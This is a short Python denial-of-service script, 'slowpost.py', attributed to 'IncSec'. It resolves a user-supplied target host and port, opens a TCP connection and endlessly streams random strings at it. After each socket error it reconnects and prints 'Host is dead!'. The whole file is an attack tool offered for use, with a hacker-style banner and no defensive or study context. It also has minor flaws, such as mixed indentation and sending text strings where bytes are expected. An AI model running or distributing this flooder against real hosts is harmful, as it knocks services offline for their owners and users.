#!/usr/bin/python
import socket, os, sys, string, random, time

if (len(sys.argv) < 3):
    print("[!] Usage: python slowpost.py <domain/ip> <port>")
    sys.exit()

target = sys.argv[1]
port = int(sys.argv[2])

def gen_string(size=10, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def banner():
    os.system('clear')
    print("""
\t\t[ %s >> %s >> %s]

\t\t              zz
\t\t    ! _    zz           _____
\t\t    |(~} zz         !  [13:37]
\t\t    |(_/__________..| =========
\t\t    |  ||:::::::::::|  |_____|

\t\t        Created by IncSec

\t\t***********************************

""" % (target, ip, port))

try:
    ip = socket.gethostbyname(target)
except socket.gaierror:
    ip = target

banner()

def flood():
    try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.settimeout(60)
        i = 0
        print("")
        while True:
            string = gen_string()
            s.sendall(string)
            i += 1
            sys.stdout.write("\tSending [ %s ] | Total sent [ %i ]\r" % (string, i)); sys.stdout.flush()
    except socket.error:
        sys.stdout.write("""
    \t________________________________________________
    \t|                                              |
    \t       Host is dead! - Sleeping 5 seconds
    \t|______________________________________________|
    """)
        time.sleep(5)
        return flood()
    except KeyboardInterrupt:
        print("\n\n[!] Canceled")
        sys.exit()

if __name__ == '__main__':
    flood()
